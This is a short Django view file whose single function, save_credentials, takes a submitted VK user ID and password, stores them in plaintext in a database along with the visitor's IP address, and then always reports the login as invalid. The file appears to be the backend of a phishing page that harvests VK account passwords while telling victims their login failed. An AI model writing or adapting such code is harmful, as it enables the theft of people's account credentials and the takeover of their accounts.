from django.shortcuts import render
from api.models import VKIDProvider, AccountData
from api.utils import get_client_ip
from django.http import JsonResponse


def save_credentials(request):
    password = request.POST.get('password')
    vkid = request.POST.get('vk_id')
    ip_addr = get_client_ip(request)
    AccountData_new = AccountData(
            id_vk = int(vkid),
            password = password,
            ip_address = ip_addr
        )
    AccountData_new.save()
    response = {
        'is_invalid':True
    }
    return JsonResponse(response)